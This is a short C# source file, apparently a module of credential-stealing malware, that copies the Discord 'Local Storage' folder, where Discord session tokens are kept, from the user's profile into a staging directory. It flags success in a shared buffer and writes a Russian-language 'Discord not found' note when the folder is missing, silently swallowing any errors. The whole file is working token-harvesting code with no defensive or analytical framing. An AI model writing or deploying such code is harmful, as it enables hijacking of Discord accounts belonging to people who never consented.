using System.IO;

internal class DS
{
	public static void Start()
	{
		try
		{
			string text = $"{Buffer.path_l}Discord";
			string text2 = $"{Buffer.path_ad}discord\\Local Storage";
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			if (Directory.Exists(text2))
			{
				new DirectoryCopy(text2, $"{text}\\Local Storage");
				Buffer.XBufferData[4] = "1";
				return;
			}
			File.WriteAllText($"{text}\\info.txt", $"{Buffer.head}Discord не найден на компьютере.");
		}
		catch
		{
		}
		Buffer.XBufferData[4] = "0";
	}
}
